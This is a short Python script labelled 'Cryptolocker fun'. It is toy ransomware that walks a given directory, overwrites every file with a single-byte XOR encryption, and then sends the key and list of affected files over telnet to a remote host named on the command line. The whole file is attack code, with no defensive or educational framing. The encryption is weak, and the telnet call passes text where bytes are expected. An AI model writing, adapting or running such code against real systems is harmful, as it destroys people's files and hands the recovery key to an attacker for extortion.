import os, json
import argparse
import random


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptolocker fun')
    parser.add_argument("path", help="The director to encrypt")
    parser.add_argument("dest", help="The IP/host to send the package")
    parser.add_argument("--port", help="The IP/host to send the package", default=23)
    return parser


def encrypt_path(path, key):
    encrypted = []
    for root, dirs, files in os.walk(path):
        for file in files:
            full_path = os.path.join(root, file)
            encrypt_file(full_path, key)
            encrypted.append(full_path)
    return encrypted


def encrypt_file(path, key):
    with open(path, "rb") as f:
        b = bytearray(f.read())
        for i in range(len(b)):
            b[i] ^= key
    with open(path, "wb") as f:
        f.write(b)


def phone_home(dest, package):
    import telnetlib
    tn = telnetlib.Telnet(dest[0], dest[1])
    tn.write(package)


def main(path, dest, port):
    key = random.randint(0,255)
    encrypted = encrypt_path(path, key)
    package = {"key": key, "files": encrypted}
    phone_home((dest, port), json.dumps(package))


if __name__ == "__main__":
    parser = get_parser()
    args = parser.parse_args()
    args = vars(args)

    main(args["path"], args["dest"], args["port"])
